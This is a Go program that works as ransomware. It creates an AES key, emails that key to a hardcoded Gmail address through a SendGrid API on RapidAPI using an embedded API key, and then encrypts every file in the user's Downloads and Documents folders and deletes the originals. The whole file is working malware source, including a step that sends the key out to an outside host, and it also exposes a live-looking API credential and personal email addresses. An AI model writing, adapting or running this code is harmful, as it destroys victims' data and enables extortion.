package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"os"
	"os/user"
	"path/filepath"
	"strings"
)

func main() {
	// Get the path for the folders containing the files to be encrypted:
	usr, _ := user.Current()
	downloads := filepath.Join(usr.HomeDir, "Downloads")
	documents := filepath.Join(usr.HomeDir, "Documents")
	foldersPath := []string{downloads, documents}

	// Generate a key
	key := make([]byte, 32)
	rand.Read(key)

	// Prepare the payload for the POST request
	payload := map[string]interface{}{
		"personalizations": []map[string]interface{}{
			{
				"to": []map[string]string{
					{"email": "paulkiragu621@gmail.com"},
				},
				"subject": "Decryption Key for " + os.Getenv("USER"),
			},
		},
		"from": map[string]string{"email": "paulsaul621@gmail.com"},
		"content": []map[string]string{
			{
				"type":  "text/plain",
				"value": base64.StdEncoding.EncodeToString(key),
			},
		},
	}

	headers := map[string]string{
		"content-type":    "application/json",
		"X-RapidAPI-Key":  "43628cd680msh1812b1660500eb7p182976jsn5dda2f77f08f",
		"X-RapidAPI-Host": "rapidprod-sendgrid-v1.p.rapidapi.com",
	}
	payloadJson, _ := json.Marshal(payload)
	//headersJson, _ := json.Marshal(headers)

	// send the POST request
	req, err := http.NewRequest("POST", "https://rapidprod-sendgrid-v1.p.rapidapi.com/mail/send", bytes.NewBuffer(payloadJson))
	req.Header.Add("Content-Type", "application/json")
	req.Header.Add("X-RapidAPI-Key", headers["X-RapidAPI-Key"])
	req.Header.Add("X-RapidAPI-Host", headers["X-RapidAPI-Host"])
	client := &http.Client{}
	response, err := client.Do(req)
	if err != nil {
		fmt.Println(err)
	}
	defer response.Body.Close()

	// Encrypt every file in the folders
	for _, folderPath := range foldersPath {
		files, _ := ioutil.ReadDir(folderPath)
		for _, file := range files {
			filePath := filepath.Join(folderPath, file.Name())
			if !strings.HasSuffix(file.Name(), ".aes") {
				// Encrypt the file
				plaintext, _ := ioutil.ReadFile(filePath)
				if len(key) != 16 && len(key) != 24 && len(key) != 32 {
					fmt.Println("Invalid key size, key must be 16, 24, or 32 bytes")
					return
				}
				block, _ := aes.NewCipher(key)
				ciphertext := make([]byte, aes.BlockSize+len(plaintext))
				iv := ciphertext[:aes.BlockSize]
				if _, err := io.ReadFull(rand.Reader, iv); err != nil {
					fmt.Println(err)
				}
				stream := cipher.NewCFBEncrypter(block, iv)
				stream.XORKeyStream(ciphertext[aes.BlockSize:], plaintext)

				// Move the encrypted file
				destinationPath := filepath.Join(folderPath, "encrypted_"+file.Name()+".aes")
				err := ioutil.WriteFile(destinationPath, ciphertext, 0644)
				if err != nil {
					fmt.Println(err)
				}
				// Delete the original file
				os.Remove(filePath)
			}
		}
	}
}
